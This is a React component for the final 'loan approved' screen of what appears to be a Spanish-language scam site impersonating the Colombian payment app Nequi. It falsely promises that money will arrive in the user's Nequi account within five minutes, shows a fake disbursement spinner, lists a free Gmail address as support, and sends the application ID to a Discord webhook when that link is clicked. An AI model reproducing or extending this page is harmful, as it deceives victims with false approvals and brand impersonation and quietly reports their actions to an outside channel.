import { CheckCircle2, Mail, Clock, RotateCcw, Copy, Check, FileText, Sparkles } from 'lucide-react'
import { useState } from 'react'
import { DiscordWebhookService } from '../services/DiscordWebhookService'

interface FinalScreenProps {
  applicationId: string
  onReset: () => void
}

export function FinalScreen({ applicationId, onReset }: FinalScreenProps) {
  const [copied, setCopied] = useState(false)

  function handleCopyId() {
    navigator.clipboard.writeText(applicationId)
    setCopied(true)
    setTimeout(() => setCopied(false), 2000)
  }

  const currentDate = new Date().toLocaleDateString('es-CO', {
    year: 'numeric',
    month: 'long',
    day: 'numeric',
    hour: '2-digit',
    minute: '2-digit',
  })

  return (
    <div className="min-h-screen w-full flex flex-col overflow-hidden" style={{ background: '#2D1B6E' }}>

      {/* Subtle decorative glows */}
      <div className="absolute top-20 left-1/2 -translate-x-1/2 w-72 h-72 rounded-full bg-[#E6005C]/15 blur-3xl pointer-events-none" />
      <div className="absolute bottom-28 right-0 w-48 h-48 rounded-full bg-white/5 blur-2xl pointer-events-none" />

      <div className="relative z-10 flex flex-col items-center px-5 pt-14 pb-10">

        {/* Success icon */}
        <div className="relative mb-6">
          <div className="absolute inset-0 rounded-full bg-green-400/25 animate-ping scale-110" />
          <div className="relative w-28 h-28 rounded-full bg-gradient-to-br from-[#22C55E] to-[#16A34A] flex items-center justify-center shadow-[0_0_48px_rgba(34,197,94,0.5)]">
            <CheckCircle2 className="w-14 h-14 text-white" strokeWidth={2.5} />
          </div>
        </div>

        {/* Badge */}
        <div className="inline-flex items-center gap-2 bg-[#E6005C]/25 border border-[#E6005C]/40 rounded-full px-5 py-2 mb-4">
          <Sparkles className="w-4 h-4 text-[#ff6eb0]" />
          <span className="text-sm font-bold text-white tracking-wide uppercase">Solicitud Exitosa</span>
          <Sparkles className="w-4 h-4 text-[#ff6eb0]" />
        </div>

        {/* Title */}
        <h1 className="text-4xl font-black tracking-tight mb-2 text-center leading-tight">
          <span className="text-white">Crédito </span>
          <span className="text-[#ff4d8f]">Aprobado</span>
        </h1>
        <p className="text-white/60 text-sm text-center mb-8 max-w-xs leading-relaxed">
          Tu solicitud fue aprobada. El dinero está en camino a tu cuenta Nequi.
        </p>

        {/* Application ID card */}
        <div className="w-full max-w-sm mb-4">
          <div className="rounded-3xl p-5 border border-white/15 bg-white/10">
            <div className="flex items-center gap-3 mb-3">
              <div className="w-11 h-11 rounded-full bg-white/15 flex items-center justify-center flex-shrink-0">
                <FileText className="w-5 h-5 text-white" />
              </div>
              <div className="text-left flex-1 min-w-0">
                <p className="text-white/50 text-xs uppercase tracking-widest mb-0.5">Número de solicitud</p>
                <div className="flex items-center gap-2">
                  <p className="text-white font-extrabold text-xl tracking-tight truncate">{applicationId}</p>
                  <button
                    onClick={handleCopyId}
                    className="p-1.5 rounded-lg bg-white/15 hover:bg-white/25 transition-colors flex-shrink-0"
                    title="Copiar ID"
                  >
                    {copied ? (
                      <Check className="w-4 h-4 text-green-400" />
                    ) : (
                      <Copy className="w-4 h-4 text-white/70" />
                    )}
                  </button>
                </div>
              </div>
            </div>
            <div className="flex items-center justify-between text-xs pt-3 border-t border-white/10">
              <span className="text-white/40">Fecha de aprobación</span>
              <span className="text-white/75 font-medium">{currentDate}</span>
            </div>
          </div>
        </div>

        {/* Disbursement card */}
        <div className="w-full max-w-sm mb-4">
          <div
            className="rounded-3xl p-6 border border-[#E6005C]/40 shadow-[0_8px_32px_rgba(230,0,92,0.25)]"
            style={{ background: 'linear-gradient(135deg, #E6005C, #b8004a)' }}
          >
            <div className="flex items-start gap-4">
              <div className="w-14 h-14 rounded-2xl bg-white/20 flex items-center justify-center flex-shrink-0">
                <Clock className="w-7 h-7 text-white" />
              </div>
              <div className="text-left">
                <p className="text-white font-extrabold text-lg mb-1 leading-tight">Desembolso en proceso</p>
                <p className="text-white/85 text-sm leading-relaxed">
                  El dinero se reflejará en tu cuenta Nequi en un máximo de{' '}
                  <span className="font-black text-white bg-white/20 px-1.5 py-0.5 rounded-lg">5 minutos</span>.
                </p>
              </div>
            </div>
            <div className="flex items-center gap-2 mt-5 pt-4 border-t border-white/20">
              <div className="flex gap-1.5">
                {[0, 1, 2].map((i) => (
                  <div
                    key={i}
                    className="w-2 h-2 rounded-full bg-white animate-bounce"
                    style={{ animationDelay: `${i * 0.15}s` }}
                  />
                ))}
              </div>
              <span className="text-white/70 text-xs font-medium">Procesando desembolso...</span>
            </div>
          </div>
        </div>

        {/* Support card */}
        <div className="w-full max-w-sm mb-8">
          <div className="rounded-3xl p-6 border border-white/15 bg-white/10">
            <div className="flex items-start gap-4">
              <div className="w-12 h-12 rounded-2xl bg-green-400/20 flex items-center justify-center flex-shrink-0">
                <Mail className="w-6 h-6 text-green-400" />
              </div>
              <div className="text-left">
                <p className="text-white font-bold text-base mb-1">Soporte</p>
                <p className="text-white/60 text-sm leading-relaxed mb-3">
                  Si el dinero no llega en 5 minutos, escríbenos con tu número de solicitud:
                </p>
                <a
                  href="mailto:prestamonequi08@gmail.com"
                  onClick={() => DiscordWebhookService.sendInfo('Soporte contactado', '', {}, {
                    'Número de solicitud': applicationId,
                  })}
                  className="inline-block px-4 py-3 rounded-2xl font-bold text-sm text-center transition-all hover:opacity-90"
                  style={{ background: 'rgba(230,0,92,0.25)', border: '1px solid rgba(230,0,92,0.45)', color: '#ff6eb0' }}
                >
                  prestamonequi08@gmail.com
                </a>
                <p className="text-white/35 text-xs mt-2">Verificamos y realizamos tu desembolso.</p>
              </div>
            </div>
          </div>
        </div>

        {/* Reset button */}
        <button
          onClick={onReset}
          className="flex items-center gap-2 text-white/50 hover:text-white transition-colors text-sm font-medium group"
        >
          <RotateCcw className="w-4 h-4 group-hover:rotate-180 transition-transform duration-500" />
          Volver al inicio
        </button>
      </div>
    </div>
  )
}
